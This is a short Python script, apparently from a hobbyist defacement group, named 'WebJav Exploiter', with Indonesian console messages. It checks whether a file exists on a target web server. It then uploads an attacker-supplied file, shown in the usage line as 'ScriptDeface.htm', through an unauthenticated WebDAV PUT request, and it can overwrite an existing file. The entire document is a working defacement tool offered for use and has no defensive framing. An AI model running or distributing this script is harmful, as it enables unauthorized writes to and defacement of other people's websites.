#!/usr/bin/python



#Coded By Cy#b3r00q


import requests
import string
import random
import sys
import os

os.system("clear")

print """
WebJav Exploiter Gan ! V.1"""

def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print("[v] Mengupload Nama File : %s") % (sys.argv[2])
  print("[v] Loading %d bytes, Script Baru") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("[!] Gagal ! . . .")
    sys.exit(1)
  else:
    print("[+] Berhasil . . .")
    print("[+] PATH : "+host + nama)


def cekfile():
 print("""
[v] WebJav Exploiter
[v] Coded With Python By Cy#b3r00q
[v] TuzzB0ll Ea
""")
 print("[v] Mengecek File : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print("[!] ADA FILE SAMA ! ")
  tanya = raw_input("[!] Timpa File ? [Y/N] > ")
  if tanya == "Y":
   webdav()
  else:
   print("[!] Babay ! . . .")
   sys.exit()
 else:
   print("[*] File Gada . . .")
   print("[*] Upload . . .")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n[*] Usage: "+sys.argv[0]+" Target.com ScriptDeface.htm\n")
    sys.exit(0)
  else:
    cekfile()
